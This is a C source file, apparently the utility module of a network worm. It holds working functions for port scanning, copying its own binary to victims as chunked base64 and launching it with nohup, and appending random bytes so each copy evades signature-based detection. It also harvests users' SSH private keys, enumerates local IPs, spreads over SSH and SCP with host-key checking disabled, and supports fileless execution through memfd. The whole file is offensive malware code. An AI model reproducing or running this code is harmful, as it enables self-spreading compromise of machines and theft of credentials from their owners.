#define _POSIX_C_SOURCE 200809L
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <limits.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <dirent.h>
#include <ifaddrs.h>
#include <time.h>
#include <stdint.h>

// Configuration
#define CHUNK_SIZE 4000
#define REMOTE_B64_PATH "/tmp/worm.b64"
#define REMOTE_WORM_PATH "/tmp/worm"
#define SCAN_TIMEOUT 2

// Base64 encoding table
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Base64 encode function
 * Returns dynamically allocated string (caller must free)
 */
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(*output_length + 1);
    if (!encoded_data) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        encoded_data[j++] = base64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 0 * 6) & 0x3F];
    }
    
    // Add padding
    for (i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }
    
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

/**
 * Get the path to the current executable
 * Returns dynamically allocated string (caller must free)
 */
char* get_executable_path(const char* argv0) {
    char* path = malloc(PATH_MAX);
    if (!path) return NULL;
    
    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
    if (len != -1) {
        path[len] = '\0';
        return path;
    }
    
    if (argv0) {
        if (argv0[0] == '/') {
            return strdup(argv0);
        }
        return strdup(argv0);
    }
    
    free(path);
    return NULL;
}

/**
 * Scan target IP for specified port
 * Returns 1 if port is open, 0 otherwise
 */
int scan_port(const char* ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return 0;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return 0;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = timeout_sec;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    int result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    close(sock);
    
    return (result == 0) ? 1 : 0;
}

/**
 * Self-replicate to target
 * execute_cmd_func: Function pointer to execute commands on target (CVE-specific)
 * Returns 1 on success, 0 on failure
 */
int self_replicate(const char* target_ip, const char* argv0, 
                   const char* remote_path,
                   int (*execute_cmd_func)(const char* ip, const char* command)) {
    if (!execute_cmd_func) {
        return 0;
    }
    
    // 1. Read own binary
    char* exe_path = get_executable_path(argv0);
    if (!exe_path) {
        exe_path = strdup("/proc/self/exe");
    }
    
    FILE* f = fopen(exe_path, "rb");
    if (!f) {
        free(exe_path);
        return 0;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long file_size_long = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size_long < 0) {
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t file_size = (size_t)file_size_long;
    
    // Read file
    unsigned char* worm_content = malloc(file_size);
    if (!worm_content) {
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t bytes_read = fread(worm_content, 1, file_size, f);
    fclose(f);
    free(exe_path);
    
    if (bytes_read != file_size) {
        free(worm_content);
        return 0;
    }
    
    size_t b64_len;
    char* b64_content = base64_encode(worm_content, file_size, &b64_len);
    free(worm_content);
    
    if (!b64_content) {
        return 0;
    }
    
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd), 
        "echo 'Content-type: text/plain'; echo; /bin/ls %s", remote_path);
    
    for (size_t i = 0; i < b64_len; i += CHUNK_SIZE) {
        size_t chunk_len = (i + CHUNK_SIZE < b64_len) ? CHUNK_SIZE : (b64_len - i);
        char* chunk = malloc(chunk_len + 1);
        if (!chunk) continue;
        
        memcpy(chunk, b64_content + i, chunk_len);
        chunk[chunk_len] = '\0';
        
        char* escaped_chunk = malloc(chunk_len * 2 + 1);
        if (escaped_chunk) {
            size_t j = 0;
            for (size_t k = 0; k < chunk_len; k++) {
                if (chunk[k] == '\'') {
                    escaped_chunk[j++] = '\'';
                    escaped_chunk[j++] = '\\';
                    escaped_chunk[j++] = '\'';
                    escaped_chunk[j++] = '\'';
                } else {
                    escaped_chunk[j++] = chunk[k];
                }
            }
            escaped_chunk[j] = '\0';
            
            char cmd[8192];
            snprintf(cmd, sizeof(cmd), "/bin/echo -n '%s' >> %s", escaped_chunk, REMOTE_B64_PATH);
            execute_cmd_func(target_ip, cmd);
            
            free(escaped_chunk);
        }
        
        free(chunk);
    }
    
    char decode_cmd[512];
    snprintf(decode_cmd, sizeof(decode_cmd), 
        "/usr/bin/base64 -d %s > %s", REMOTE_B64_PATH, remote_path);
    execute_cmd_func(target_ip, decode_cmd);
    
    char exec_cmd[512];
    snprintf(exec_cmd, sizeof(exec_cmd), 
        "nohup %s > /tmp/worm.log 2>&1 &", remote_path);
    execute_cmd_func(target_ip, exec_cmd);
    
    free(b64_content);
    return 1;
}

// Helper for memmem if not available
static void *find_mem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
    if (needlelen > haystacklen) return NULL;
    if (needlelen == 0) return (void *)haystack;
    
    const char *h = haystack;
    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (memcmp(h + i, needle, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

/**
 * Polymorphic engine - adds random bytes to worm binary
 * Returns dynamically allocated modified content (caller must free)
 * 
 * Algorithm:
 * 1. Find last occurrence of marker "DEADBEEF_WORM_END" (if exists from previous mutation)
 * 2. If marker found near end (< 100 bytes after), use position as original_len
 *    (This allows re-mutating already-mutated binaries correctly)
 * 3. Generate 10-50 random bytes
 * 4. Append marker + random bytes to original binary
 * 
 * Purpose: Create unique binary variants to evade signature-based detection
 * Each propagation creates a different binary hash while maintaining functionality
 */
unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_t* new_len) {
    // Magic marker to identify end of original binary
    const char *marker = "DEADBEEF_WORM_END";
    size_t marker_len = strlen(marker);
    
    unsigned char *found = NULL;
    unsigned char *current = file_content;
    unsigned char *next_found = NULL;
    
    // Find last occurrence of marker (in case binary was already mutated)
    while ((next_found = find_mem(current, total_read - (current - file_content), marker, marker_len))) {
        found = next_found;
        current = found + 1;
    }
    
    size_t original_len = total_read;
    
    // If marker found very close to end, it's from previous mutation
    // Use marker position as original_len to avoid mutating the mutation
    if (found) {
        size_t offset = found - file_content;
        size_t remaining = total_read - offset;
        
        if (remaining < (marker_len + 100)) {
            original_len = offset;
        }
    }
    
    // Generate random bytes (10-50 bytes) to create unique variant
    int random_bytes_count = 10 + (rand() % 41);
    
    // Calculate new size: original + marker + random bytes
    *new_len = original_len + marker_len + random_bytes_count;
    
    // Allocate new buffer
    unsigned char* new_content = malloc(*new_len);
    if (!new_content) {
        return NULL;
    }
    
    // Copy original content (up to marker if found)
    memcpy(new_content, file_content, original_len);
    
    // Append marker to mark end of original
    memcpy(new_content + original_len, marker, marker_len);
    
    // Append random bytes for polymorphism
    for (int i = 0; i < random_bytes_count; i++) {
        new_content[original_len + marker_len + i] = rand() % 256;
    }
    
    return new_content;
}

/**
 * Read SSH private keys from user home directories .ssh/id_rsa
 * Returns the number of keys found
 */
int read_ssh_keys(char** key_list, int max_keys) {
    int count = 0;
    DIR* home_dir = opendir("/home");
    if (!home_dir) return 0;
    
    struct dirent* entry;
    while ((entry = readdir(home_dir)) != NULL && count < max_keys) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        
        char user_path[256];
        snprintf(user_path, sizeof(user_path), "/home/%s", entry->d_name);
        
        struct stat st;
        if (stat(user_path, &st) == 0 && S_ISDIR(st.st_mode)) {
            char key_path[256];
            snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", user_path);
            
            if (access(key_path, R_OK) == 0) {
                key_list[count] = strdup(key_path);
                count++;
            }
        }
    }
    closedir(home_dir);
    return count;
}

/**
 * Get all local IP addresses of the host (excluding loopback)
 */
void get_local_ips(char** ip_list, int* count, int max_ips) {
    *count = 0;
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        return;
    }
    
    for (ifa = ifaddr; ifa != NULL && *count < max_ips; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            char *ip = inet_ntoa(addr->sin_addr);
            // Skip localhost
            if (strcmp(ip, "127.0.0.1") != 0) {
                ip_list[*count] = strdup(ip);
                (*count)++;
            }
        }
    }
    
    freeifaddrs(ifaddr);
}

/**
 * Execute command via SSH
 * Returns 1 on success, 0 on failure
 */
int run_ssh_command(const char* ip, const char* key_path, const char* user, const char* command) {
    char ssh_cmd[4096];
    snprintf(ssh_cmd, sizeof(ssh_cmd),
        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
        "-i %s %s@%s '%s' 2>/dev/null",
        key_path, user, ip, command);
    
    int result = system(ssh_cmd);
    return (result == 0) ? 1 : 0;
}

/**
 * Transfer file via SCP
 * Returns 1 on success, 0 on failure
 */
int scp_transfer(const char* ip, const char* key_path, const char* user, const char* local_file, const char* remote_file) {
    char scp_cmd[4096];
    snprintf(scp_cmd, sizeof(scp_cmd),
        "scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
        "-i %s %s %s@%s:%s 2>/dev/null",
        key_path, local_file, user, ip, remote_file);
    
    int result = system(scp_cmd);
    return (result == 0) ? 1 : 0;
}

/**
 * Read own binary with memfd FD support
 * Returns dynamically allocated content (caller must free)
 * 
 * Reading strategy (priority order):
 * 1. Try memfd file descriptor (MEMFD_FD env var) - for fileless execution
 *    Worm was loaded into memory via memfd_create, FD passed via environment
 * 2. Fallback to /proc/self/exe - for normal file execution
 * 
 * This enables self-replication regardless of how the worm was executed
 */
unsigned char* read_own_binary(const char* argv0, size_t* file_size) {
    unsigned char* worm_content = NULL;
    *file_size = 0;
    int fd = -1;
    
    // Priority 1: Read from memfd file descriptor (fileless execution)
    char* fd_str = getenv("MEMFD_FD");
    if (fd_str) {
        fd = atoi(fd_str);
        
        // Verify FD is valid and readable
        if (fcntl(fd, F_GETFD) != -1) {
            off_t size = lseek(fd, 0, SEEK_END);
            if (size >= 0) {
                *file_size = (size_t)size;
                lseek(fd, 0, SEEK_SET);
                
                worm_content = malloc(*file_size);
                if (worm_content) {
                    ssize_t bytes_read = read(fd, worm_content, *file_size);
                    if (bytes_read < 0 || (size_t)bytes_read != *file_size) {
                        free(worm_content);
                        worm_content = NULL;
                    }
                }
            }
        }
    }
    
    // Priority 2: Read from filesystem (/proc/self/exe)
    if (!worm_content) {
        char* exe_path = get_executable_path(argv0);
        if (!exe_path) {
            exe_path = strdup("/proc/self/exe");
        }
        
        FILE* f = fopen(exe_path, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            long file_size_long = ftell(f);
            fseek(f, 0, SEEK_SET);
            
            if (file_size_long >= 0) {
                *file_size = (size_t)file_size_long;
                
                worm_content = malloc(*file_size);
                if (worm_content) {
                    size_t bytes_read = fread(worm_content, 1, *file_size, f);
                    if (bytes_read != *file_size) {
                        free(worm_content);
                        worm_content = NULL;
                    }
                }
            }
            fclose(f);
        }
        free(exe_path);
    }
    
    return worm_content;
}

